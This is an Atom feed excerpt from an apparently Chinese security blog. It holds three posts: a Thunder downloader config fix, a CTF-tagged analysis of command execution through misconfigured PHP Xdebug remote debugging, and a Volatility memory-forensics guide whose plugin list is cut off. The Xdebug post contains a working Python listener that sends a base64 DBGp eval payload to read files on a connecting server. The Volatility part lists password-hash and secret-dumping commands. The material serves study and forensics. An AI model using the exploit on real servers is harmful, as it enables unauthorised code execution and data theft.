    <content type="html"><![CDATA[<p>最近在下载 NVDIA 的 CUDA 工具包，经常是下载到一半就无法下载，查看了错误信息是提示 403，反复试了几次都无法下载成功。看了下载链接每次下载都是后面带一个 Token，新的 Token 可以用旧的 Token 失效了。自然想到去修改下载地址，让迅雷能继续工作，但是迅雷却找不到这个功能。</p><p>研究了一下，发现迅雷下载是由两个文件组成：</p><ol><li>配置文件，例如 cuda_8.0.61_win10.exe.td.cfg</li><li>数据文件，例如 cuda_8.0.61_win10.exe.td</li></ol><p>配置文件里面存储了下载的 URL 地址，可以直接使用 NotePad++ 进行修改，记住一共有两个地方要修改。</p><p><img src="/uploads/post_img/2017/12/xunlei_1.png" alt="xunlei_1.png"></p><p>然后还要修改下载地址的长度，这里是 <code>1A 01</code>，因为是小端序，所以要转成 <code>01 1A</code> 刚好是 <code>282</code>，跟这里的字符串长度一致，这里可以使用 WinHex 进行修改。</p><p><img src="/uploads/post_img/2017/12/xunlei_2.png" alt="xunlei_2.png"></p><p>最关键的一步，需要先在迅雷中删除下载任务，但是不要删除文件，然后将 <code>cuda_8.0.61_win10.exe.td</code> 文件重新拖动到迅雷的下载界面中，然后又可以欢快的继续下载啦～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在下载 NVDIA 的 CUDA 工具包，经常是下载到一半就无法下载，查看了错误信息是提示 403，反复试了几次都无法下载成功。看了下载链接每次下载都是后面带一个 Token，新的 Token 可以用旧的 Token 失效了。自然想到去修改下载地址，让迅雷能继续工作，但
      
    
    </summary>
    
      <category term="工具" scheme="http://www.restran.net/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="错误解决" scheme="http://www.restran.net/tags/%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"/>
    
      <category term="工具" scheme="http://www.restran.net/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="迅雷" scheme="http://www.restran.net/tags/%E8%BF%85%E9%9B%B7/"/>
    
  </entry>
  
  <entry>
    <title>PHP Xdebug 远程调试命令执行分析</title>
    <link href="http://www.restran.net/2017/09/16/php-xdebug-cmd-exec/"/>
    <id>http://www.restran.net/2017/09/16/php-xdebug-cmd-exec/</id>
    <published>2017-09-15T16:00:00.000Z</published>
    <updated>2017-09-16T17:08:39.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xdebug.org/" target="_blank" rel="noopener">Xdebug</a> 是 PHP 的调试工具，为 PHP 脚本与调试器客户端提供了一个接口，使用 <a href="https://xdebug.org/docs-dbgp.php" target="_blank" rel="noopener">DBGp</a> 协议进行交互，使用的是 XML 格式的数据。在调试的时候，可以通过调试器在服务器上执行任意代码。通过 <code>phpinfo()</code> 可以查看 WebServer 上是否有开启 Xdebug，由于 Xdebug 支持远程调试，如果服务器上配置不当，可能引起远程任意命令执行。</p><p><img src="/uploads/post_img/2017/09/xdebug.jpg" alt="xdebug.jpg"></p><p>Xdebug 在 <code>php.ini</code> 中进行配置，比较关键参数有几项：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 启用远程调试</span></span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line"><span class="comment">; 如果开启此项配置，将忽略 xdebug.remote_host 的参数</span></span><br><span class="line"><span class="comment">; 浏览器访问任意 php 页面时，服务器会以当前客户端 IP 作为 remote_host</span></span><br><span class="line">xdebug.remote_connect_back=1</span><br><span class="line"><span class="comment">; 绑定远程调试主机地址</span></span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line"><span class="comment">; 远程主机监听的端口</span></span><br><span class="line">xdebug.remote_port=9000</span><br></pre></td></tr></table></figure><p>PHP 允许动态识别是否启动调试，当访问任意 PHP 页面时，如果浏览器的 GET，POST，COOKIE 中包含 XDEBUG_SESSION_START 参数，且 php 开启了 xdebug 模块，则会与 remote_host 的调试端口通过 TCP 协议建立会话进行 debug 信息的交互。</p><h2 id="数据流程"><a href="#数据流程" class="headerlink" title="数据流程"></a>数据流程</h2><h3 id="固定-IP-地址"><a href="#固定-IP-地址" class="headerlink" title="固定 IP 地址"></a>固定 IP 地址</h3><p>xdebug.remote_connect_back=0 的情况，这也是 Xdebug 的默认方式。</p><p><img src="/uploads/post_img/2017/09/xdebug_1.jpg" alt="xdebug_1.jpg"></p><h3 id="动态-IP-地址"><a href="#动态-IP-地址" class="headerlink" title="动态 IP 地址"></a>动态 IP 地址</h3><p>xdebug.remote_connect_back=1 的情况</p><p><img src="/uploads/post_img/2017/09/xdebug_2.jpg" alt="xdebug_2.jpg"></p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p>Chrome 中有一个 <a href="https://chrome.google.com/webstore/detail/xdebug/nhodjblplijafdpjjfhhanfmchplpfgl?hl=en-GB&amp;gl=GB" target="_blank" rel="noopener">Xdebug</a> 插件，可以进行远程调试，<a href="https://github.com/artbek/chrome-xdebug-client" target="_blank" rel="noopener">Github 地址</a>。在Xdebug 插件中开启监听，访问服务端的任意 PHP 页面，带上 XDEBUG_SESSION_START 参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.10:8080/test.php?XDEBUG_SESSION_START=1</span><br></pre></td></tr></table></figure><p><img src="/uploads/post_img/2017/09/xdebug_chrome.jpg" alt="xdebug_chrome.jpg"></p><p>Xdebug 插件可以接收到调试会话，然后可以在上面执行任意命令。通过抓包分析可以发现，调试会话的消息是通过 XML 进行交互，会话建立的时候，服务端会发送：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">490.&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">init</span> <span class="attr">xmlns</span>=<span class="string">"urn:debugger_protocol_v1"</span> <span class="attr">xmlns:xdebug</span>=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="attr">fileuri</span>=<span class="string">"file:///D:/PHP/PHPStudy/WWW/phpinfo.php"</span> <span class="attr">language</span>=<span class="string">"PHP"</span> <span class="attr">xdebug:language_version</span>=<span class="string">"5.4.45"</span> <span class="attr">protocol_version</span>=<span class="string">"1.0"</span> <span class="attr">appid</span>=<span class="string">"4288"</span> <span class="attr">idekey</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">engine</span> <span class="attr">version</span>=<span class="string">"2.4.1"</span>&gt;</span>&lt;![CDATA[Xdebug]]&gt;<span class="tag">&lt;/<span class="name">engine</span>&gt;</span><span class="tag">&lt;<span class="name">author</span>&gt;</span>&lt;![CDATA[Derick Rethans]]&gt;<span class="tag">&lt;/<span class="name">author</span>&gt;</span><span class="tag">&lt;<span class="name">url</span>&gt;</span>&lt;![CDATA[http://xdebug.org]]&gt;<span class="tag">&lt;/<span class="name">url</span>&gt;</span><span class="tag">&lt;<span class="name">copyright</span>&gt;</span>&lt;![CDATA[Copyright (c) 2002-2016 by Derick Rethans]]&gt;<span class="tag">&lt;/<span class="name">copyright</span>&gt;</span><span class="tag">&lt;/<span class="name">init</span>&gt;</span>.</span><br></pre></td></tr></table></figure><p>当在 xdebug 中执行 PHP 代码时，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(file_get_contents(&apos;D:/1.txt&apos;), true)</span><br></pre></td></tr></table></figure><p>会发送这种格式的数据给 WebServer，<code>-i 63</code> 是会话编号，可以取任意的数字，后面是 php 代码的 base64，最后的 . 是 <code>\x00</code>。而且发送的数据包内容必须是 304 的倍数，多余的部分以 <code>\x00</code> 填充。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval -i 63 -- cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnRDovMS50eHQnKSwgdHJ1ZSk=............................................................................</span><br></pre></td></tr></table></figure><p>当服务端接收到调试器发送的命令后，会执行其中的 PHP 代码，并返回执行结果，这个过程会返回很多个 response，其中第一个 response 就是 PHP 代码的执行结果，同样是以 base64 编码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">260.&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">response</span> <span class="attr">xmlns</span>=<span class="string">"urn:debugger_protocol_v1"</span> <span class="attr">xmlns:xdebug</span>=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="attr">command</span>=<span class="string">"eval"</span> <span class="attr">transaction_id</span>=<span class="string">"63"</span>&gt;</span><span class="tag">&lt;<span class="name">property</span> <span class="attr">type</span>=<span class="string">"string"</span> <span class="attr">size</span>=<span class="string">"4"</span> <span class="attr">encoding</span>=<span class="string">"base64"</span>&gt;</span>&lt;![CDATA[dGVzdA==]]&gt;<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析了 Xdebug 调试的交互过程，可以写出一个脚本来执行任意命令。如果是在公网上的 PHP 网站，需要有一个公网 IP 才能实现远程调试，如果只有 Linux 的公网服务器可用，可以使用这个脚本来模拟这个过程。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> BaseRequestHandler, TCPServer</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line">php_code = <span class="string">b"print_r(file_get_contents('D:/1.txt'), true)"</span></span><br><span class="line">payload = <span class="string">b"""eval -i 105 -- %s"""</span> % b64encode(php_code)</span><br><span class="line"><span class="comment"># 总长度是304的倍数</span></span><br><span class="line"><span class="keyword">if</span> len(payload) % <span class="number">304</span> != <span class="number">0</span>:</span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span> * (<span class="number">304</span> - len(payload) % <span class="number">304</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoHandler</span><span class="params">(BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> count</span><br><span class="line">        print(<span class="string">'Got connection from'</span>, self.client_address)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            msg = self.request.recv(<span class="number">8192</span>)</span><br><span class="line">            print(msg)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> msg:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">                self.request.send(payload)</span><br><span class="line"></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    serv = TCPServer((<span class="string">''</span>, <span class="number">9000</span>), EchoHandler)</span><br><span class="line">    serv.serve_forever()</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://paper.seebug.org/308/" target="_blank" rel="noopener">https://paper.seebug.org/308/</a></li><li><a href="https://weizhimiao.github.io/2016/10/22/Xdebug之远程调试/" target="_blank" rel="noopener">https://weizhimiao.github.io/2016/10/22/Xdebug之远程调试/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://xdebug.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Xdebug&lt;/a&gt; 是 PHP 的调试工具，为 PHP 脚本与调试器客户端提供了一个接口，使用 &lt;a href=&quot;https://xdebug.org
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.restran.net/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.restran.net/tags/CTF/"/>
    
      <category term="PHP" scheme="http://www.restran.net/tags/PHP/"/>
    
      <category term="Xdebug" scheme="http://www.restran.net/tags/Xdebug/"/>
    
  </entry>
  
  <entry>
    <title>内存取证工具 volatility 使用说明</title>
    <link href="http://www.restran.net/2017/08/10/memory-forensics-tool-volatility/"/>
    <id>http://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</id>
    <published>2017-08-09T16:00:00.000Z</published>
    <updated>2017-08-10T00:41:42.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/volatilityfoundation/volatility" target="_blank" rel="noopener">volatility</a> 是一款内存取证和分析工具，可以对 Procdump 等工具 dump 出来的内存进行分析，并提取内存中的文件。该工具支持 Windows 和 Linux，Kali 下面默认已经安装。</p><p>volatility 的许多功能由其内置的各种插件来实现，例如查看当前的网络连接，命令行中的命令，记事本中的内容等等。</p><p>命令格式</p><pre><code>volatility [plugin] -f [image] --profile=[profile] </code></pre><p>在分析之前，需要先判断当前的镜像信息，分析出是哪个操作系统</p><pre><code>volatility imageinfo -f file.raw</code></pre><p>知道镜像后，就可以在 –profile 中带上对应的操作系统</p><h2 id="常见的插件"><a href="#常见的插件" class="headerlink" title="常见的插件"></a>常见的插件</h2><p>查看当前展示的 notepad 文本</p><pre><code>volatility notepad -f file.raw --profile=WinXPSP2x86</code></pre><p>查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容</p><pre><code>volatility hashdump -f file.raw --profile=WinXPSP2x86</code></pre><p>查看所有进程</p><pre><code>volatility psscan -f file.raw --profile=WinXPSP2x86</code></pre><p>扫描所有的文件列表</p><pre><code>volatility filescan -f file.raw --profile=WinXPSP2x86</code></pre><p>扫描 Windows 的服务</p><pre><code>volatility svcscan -f file.raw --profile=WinXPSP2x86</code></pre><p>查看网络连接</p><pre><code>volatility connscan -f file.raw --profile=WinXPSP2x86</code></pre><p>查看命令行上的操作</p><pre><code>volatility cmdscan -f file.raw --profile=WinXPSP2x86</code></pre><p>根据进程的 pid dump出指定进程到指定的文件夹dump_dir</p><pre><code>volatility memdump -p 120 -f file.raw --profile=WinXPSP2x86 --dump-dir=dump_dir</code></pre><p>dump 出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 经常会有问题，需要重新修复文件</p><p>对当前的窗口界面，生成屏幕截图</p><pre><code>volatility screenshot -f file.raw --profile=WinXPSP2x86 --dump-dir=out</code></pre><h2 id="支持的各种插件"><a href="#支持的各种插件" class="headerlink" title="支持的各种插件"></a>支持的各种插件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line">Plugins</span><br><span class="line">-------</span><br><span class="line">amcache                    - Print AmCache information</span><br><span class="line">apihooks                   - Detect API hooks in process and kernel memory</span><br><span class="line">atoms                      - Print session and window station atom tables</span><br><span class="line">atomscan                   - Pool scanner for atom tables</span><br><span class="line">auditpol                   - Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv</span><br><span class="line">bigpools                   - Dump the big page pools using BigPagePoolScanner</span><br><span class="line">bioskbd                    - Reads the keyboard buffer from Real Mode memory</span><br><span class="line">cachedump                  - Dumps cached domain hashes from memory</span><br><span class="line">callbacks                  - Print system-wide notification routines</span><br><span class="line">clipboard                  - Extract the contents of the windows clipboard</span><br><span class="line">cmdline                    - Display process command-line arguments</span><br><span class="line">cmdscan                    - Extract command history by scanning for _COMMAND_HISTORY</span><br><span class="line">connections                - Print list of open connections [Windows XP and 2003 Only]</span><br><span class="line">connscan                   - Pool scanner for tcp connections</span><br><span class="line">consoles                   - Extract command history by scanning for _CONSOLE_INFORMATION</span><br><span class="line">crashinfo                  - Dump crash-dump information</span><br><span class="line">deskscan                   - Poolscaner for tagDESKTOP (desktops)</span><br><span class="line">devicetree                 - Show device tree</span><br><span class="line">dlldump                    - Dump DLLs from a process address space</span><br><span class="line">dlllist                    - Print list of loaded dlls for each process</span><br><span class="line">driverirp                  - Driver IRP hook detection</span><br><span class="line">drivermodule               - Associate driver objects to kernel modules</span><br><span class="line">driverscan                 - Pool scanner for driver objects</span><br><span class="line">dumpcerts                  - Dump RSA private and public SSL keys</span><br><span class="line">dumpfiles                  - Extract memory mapped and cached files</span><br><span class="line">dumpregistry               - Dumps registry files out to disk</span><br><span class="line">editbox                    - Displays information about Edit controls. (Listbox experimental.)</span><br><span class="line">envars                     - Display process environment variables</span><br><span class="line">eventhooks                 - Print details on windows event hooks</span><br><span class="line">evtlogs                    - Extract Windows Event Logs (XP/2003 only)</span><br><span class="line">filescan                   - Pool scanner for file objects</span><br><span class="line">gahti                      - Dump the USER handle type information</span><br><span class="line">gditimers                  - Print installed GDI timers and callbacks</span><br><span class="line">gdt                        - Display Global Descriptor Table</span><br><span class="line">getservicesids             - Get the names of services in the Registry and return Calculated SID</span><br><span class="line">getsids                    - Print the SIDs owning each process</span><br><span class="line">handles                    - Print list of open handles for each process</span><br><span class="line">hashdump                   - Dumps passwords hashes (LM/NTLM) from memory</span><br><span class="line">hibinfo                    - Dump hibernation file information</span><br><span class="line">hivedump                   - Prints out a hive</span><br><span class="line">hivelist                   - Print list of registry hives.</span><br><span class="line">hivescan                   - Pool scanner for registry hives</span><br><span class="line">hpakextract                - Extract physical memory from an HPAK file</span><br><span class="line">hpakinfo                   - Info on an HPAK file</span><br><span class="line">idt                        - Display Interrupt Descriptor Table</span><br><span class="line">iehistory                  - Reconstruct Internet Explorer cache / history</span><br><span class="line">imagecopy                  - Copies a physical address space out as a raw DD image</span><br><span class="line">imageinfo                  - Identify information for the image</span><br><span class="line">impscan                    - Scan for calls to imported functions</span><br><span class="line">joblinks                   - Print process job link information</span><br><span class="line">kdbgscan                   - Search for and dump potential KDBG values</span><br><span class="line">kpcrscan                   - Search for and dump potential KPCR values</span><br><span class="line">ldrmodules                 - Detect unlinked DLLs</span><br><span class="line">limeinfo                   - Dump Lime file format information</span><br><span class="line">linux_apihooks             - Checks for userland apihooks</span><br><span class="line">linux_arp                  - Print the ARP table</span><br><span class="line">linux_aslr_shift           - Automatically detect the Linux ASLR shift</span><br><span class="line">linux_banner               - Prints the Linux banner information</span><br><span class="line">linux_bash                 - Recover bash history from bash process memory</span><br><span class="line">linux_bash_env             - Recover a process&apos; dynamic environment variables</span><br><span class="line">linux_bash_hash            - Recover bash hash table from bash process memory</span><br><span class="line">linux_check_afinfo         - Verifies the operation function pointers of network protocols</span><br><span class="line">linux_check_creds          - Checks if any processes are sharing credential structures</span><br><span class="line">linux_check_evt_arm        - Checks the Exception Vector Table to look for syscall table hooking</span><br><span class="line">linux_check_fop            - Check file operation structures for rootkit modifications</span><br><span class="line">linux_check_idt            - Checks if the IDT has been altered</span><br><span class="line">linux_check_inline_kernel  - Check for inline kernel hooks</span><br><span class="line">linux_check_modules        - Compares module list to sysfs info, if available</span><br><span class="line">linux_check_syscall        - Checks if the system call table has been altered</span><br><span class="line">linux_check_syscall_arm    - Checks if the system call table has been altered</span><br><span class="line">linux_check_tty            - Checks tty devices for hooks</span><br><span class="line">linux_cpuinfo              - Prints info about each active processor</span><br><span class="line">linux_dentry_cache         - Gather files from the dentry cache</span><br><span class="line">linux_dmesg                - Gather dmesg buffer</span><br><span class="line">linux_dump_map             - Writes selected memory mappings to disk</span><br><span class="line">linux_dynamic_env          - Recover a process&apos; dynamic environment variables</span><br><span class="line">linux_elfs                 - Find ELF binaries in process mappings</span><br><span class="line">linux_enumerate_files      - Lists files referenced by the filesystem cache</span><br><span class="line">linux_find_file            - Lists and recovers files from memory</span><br><span class="line">linux_getcwd               - Lists current working directory of each process</span><br><span class="line">linux_hidden_modules       - Carves memory to find hidden kernel modules</span><br><span class="line">linux_ifconfig             - Gathers active interfaces</span><br><span class="line">linux_info_regs            - It&apos;s like &apos;info registers&apos; in GDB. It prints out all the</span><br><span class="line">linux_iomem                - Provides output similar to /proc/iomem</span><br><span class="line">linux_kernel_opened_files  - Lists files that are opened from within the kernel</span><br><span class="line">linux_keyboard_notifiers   - Parses the keyboard notifier call chain</span><br><span class="line">linux_ldrmodules           - Compares the output of proc maps with the list of libraries from libdl</span><br><span class="line">linux_library_list         - Lists libraries loaded into a process</span><br><span class="line">linux_librarydump          - Dumps shared libraries in process memory to disk</span><br><span class="line">linux_list_raw             - List applications with promiscuous sockets</span><br><span class="line">linux_lsmod                - Gather loaded kernel modules</span><br><span class="line">linux_lsof                 - Lists file descriptors and their path</span><br><span class="line">linux_malfind              - Looks for suspicious process mappings</span><br><span class="line">linux_memmap               - Dumps the memory map for linux tasks</span><br><span class="line">linux_moddump              - Extract loaded kernel modules</span><br><span class="line">linux_mount                - Gather mounted fs/devices</span><br><span class="line">linux_mount_cache          - Gather mounted fs/devices from kmem_cache</span><br><span class="line">linux_netfilter            - Lists Netfilter hooks</span><br><span class="line">linux_netscan              - Carves for network connection structures</span><br><span class="line">linux_netstat              - Lists open sockets</span><br><span class="line">linux_pidhashtable         - Enumerates processes through the PID hash table</span><br><span class="line">linux_pkt_queues           - Writes per-process packet queues out to disk</span><br><span class="line">linux_plthook              - Scan ELF binaries&apos; PLT for hooks to non-NEEDED images</span><br><span class="line">linux_proc_maps            - Gathers process memory maps</span><br><span class="line">linux_proc_maps_rb         - Gathers process maps for linux through the mappings red-black tree</span><br><span class="line">linux_procdump             - Dumps a process&apos;s executable image to disk</span><br><span class="line">linux_process_hollow       - Checks for signs of process hollowing</span><br><span class="line">linux_psaux                - Gathers processes along with full command line and start time</span><br><span class="line">linux_psenv                - Gathers processes along with their static environment variables</span><br><span class="line">linux_pslist               - Gather active tasks by walking the task_struct-&gt;task list</span><br><span class="line">linux_pslist_cache         - Gather tasks from the kmem_cache</span><br><span class="line">linux_psscan               - Scan physical memory for processes</span><br><span class="line">linux_pstree               - Shows the parent/child relationship between processes</span><br><span class="line">linux_psxview              - Find hidden processes with various process listings</span><br><span class="line">linux_recover_filesystem   - Recovers the entire cached file system from memory</span><br><span class="line">linux_route_cache          - Recovers the routing cache from memory</span><br><span class="line">linux_sk_buff_cache        - Recovers packets from the sk_buff kmem_cache</span><br><span class="line">linux_slabinfo             - Mimics /proc/slabinfo on a running machine</span><br><span class="line">linux_strings              - Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">linux_threads              - Prints threads of processes</span><br><span class="line">linux_tmpfs                - Recovers tmpfs filesystems from memory</span><br><span class="line">linux_truecrypt_passphrase - Recovers cached Truecrypt passphrases</span><br><span class="line">linux_vma_cache            - Gather VMAs from the vm_area_struct cache</span><br><span class="line">linux_volshell             - Shell in the memory image</span><br><span class="line">linux_yarascan             - A shell in the Linux memory image</span><br><span class="line">lsadump                    - Dump (decrypted) LSA secrets from the registry</span><br><span class="line">mac_adium                  - Lists Adium messages</span><br><span class="line">mac_apihooks               - Checks for API hooks in processes</span><br><span class="line">mac_apihooks_kernel        - Checks to see if system call and kernel functions are hooked</span><br><span class="line">mac_arp                    - Prints the arp 